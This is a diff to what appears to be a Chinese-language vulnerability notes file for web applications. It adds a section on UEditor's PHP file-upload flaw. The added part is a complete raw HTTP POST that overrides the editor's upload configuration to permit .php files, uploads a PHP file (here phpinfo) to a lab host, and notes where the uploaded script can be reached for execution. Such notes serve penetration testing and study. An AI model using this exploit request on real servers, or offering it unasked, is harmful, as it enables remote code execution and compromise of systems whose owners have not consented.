@@ -1223,6 +1223,29 @@ app="海洋CMS"
 [Ueditor编辑器漏洞（文件上传）](https://www.jianshu.com/p/681162ed0374)
 
 [theLSA/ueditor-getshell](https://github.com/theLSA/ueditor-getshell)
+###php版本上传getshell
+
+POST /ueditor1_4_3_3-gbk-php/gbk-php/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=gbk-php/php/upload/fuck&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=fuck HTTP/1.1
+Host: 192.168.232.156
+Content-Length: 214
+Cache-Control: max-age=0
+Origin: http://192.168.232.156
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVONn1aO9fhHlsRx8
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+------WebKitFormBoundaryVONn1aO9fhHlsRx8
+Content-Disposition: form-data; name="fuck"; filename="fuck.php"
+Content-Type: application/octet-stream
+
+<?php phpinfo();?>
+------WebKitFormBoundaryVONn1aO9fhHlsRx8--
+
+注意点：上传路径拼接类似ueditor版本号等自定义路径，解析路径为/ueditor/php/upload/fuck.php
 
 ## Vmware
 
